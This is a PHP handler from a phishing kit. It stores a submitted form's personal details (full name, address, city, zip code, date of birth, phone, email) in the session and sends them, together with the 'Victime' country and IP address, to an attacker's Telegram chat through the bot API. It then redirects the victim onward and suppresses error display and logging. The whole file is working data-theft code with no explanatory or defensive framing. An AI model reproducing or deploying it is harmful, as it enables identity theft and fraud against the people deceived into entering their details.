<?php
session_start();
//** Cleaned by M3dcoder telegram : https://t.me/M3dL4m1n3 **//
error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE);
@ini_set('html_errors', '0');
@ini_set('display_errors', '0');
@ini_set('display_startup_errors', '0');
@ini_set('log_errors', '0');

include('../AlexRony/911.php');
include('../AlexRony/COUNTRY.php');
include('../AlexRony/SYS.php');
include('../AlexRony/TELEGRMAT.php');

if (isset($_POST['submit'])) {
$_SESSION['full'] = $_POST['full'];
$_SESSION['adress'] = $_POST['adress'];
$_SESSION['city'] = $_POST['city'];
$_SESSION['zip'] = $_POST['zip'];
$_SESSION['dob'] = $_POST['dob'];
$_SESSION['phone'] = $_POST['phone'];
$_SESSION['email'] = $_POST['email'];
    $message = "|=======🔋/FULL-INFOS\🔋======|" . "\n";
    $message .= "| Full-Name: " . $_POST['full'] . "\n";
    $message .= "| A-ddress: " . $_POST['adress'] . "\n";
    $message .= "| C-ity: " . $_POST['city'] . "\n";
    $message .= "| Zip-code: " . $_POST['zip'] . "\n";
    $message .= "| DO-OB: " . $_POST['dob'] . "\n";
    $message .= "| Phone-Number: " . $_POST['phone'] . "\n";
    $message .= "| E-mail: " . $_POST['email'] . "\n";
    $message .= "|========🔋/ END-INFOS\ 🔋 ========|" . "\n";
    $message .= "+ Victime country: ".$get_user_country. "\n";
    $message .= "+ Victime IP: ".$ip."\n";
    $message .= "|===============/🔰\============|";

    $data = [
        'text' => $message,
        'chat_id' => $chat_id,
    ];

    file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data));

    header('Location: ../B.php?cred=1#sHFHJHDHDHKJDJDSDSJDSJKJDSJDSDJJDSHYKJHGFG');
    exit;
}
?>
